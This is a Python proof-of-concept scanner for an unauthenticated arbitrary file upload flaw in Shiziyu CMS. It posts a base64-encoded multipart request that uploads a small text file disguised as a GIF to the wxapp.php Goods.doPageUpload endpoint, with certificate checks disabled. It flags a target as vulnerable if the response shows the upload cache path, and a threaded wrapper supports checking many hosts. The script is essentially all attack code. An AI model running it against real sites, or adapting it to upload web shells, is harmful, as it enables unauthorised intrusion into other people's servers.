#!/usr/bin/env python
# coding=utf-8
import base64
from termcolor import colored
import requests,threading
requests.packages.urllib3.disable_warnings()  #忽略证书报错
results = ''
def pscan_vuln(url):
    urls = url
    global results
    headers = {
        "Content-Length": "213",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "null",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
    }
    data = base64.b64decode('LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5OFVhQU5tV0FnTTRCcUJTcwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwZmlsZSI7IGZpbGVuYW1lPSJ0ZXN0LnR4dCIKQ29udGVudC1UeXBlOiBpbWFnZS9naWYKCnNjYW4KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5OFVhQU5tV0FnTTRCcUJTcy0t')
    try:
        response = requests.post(url +'/wxapp.php?controller=Goods.doPageUpload', headers=headers,data=data,verify=False,timeout=20)
        if '\/Uploads\/image\/cache\/goods\/' in response.text:
            print(colored('[+]存在狮子鱼CMSwxapp.php任意文件上传', 'red'))
            results = f'{urls}-->存在狮子鱼CMSwxapp.php任意文件上传'
        else:
            print('[-]不存在狮子鱼CMSwxapp.php任意文件上传')
    except:
        print('[-]不存在狮子鱼CMSwxapp.php任意文件上传')

def szy1(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results

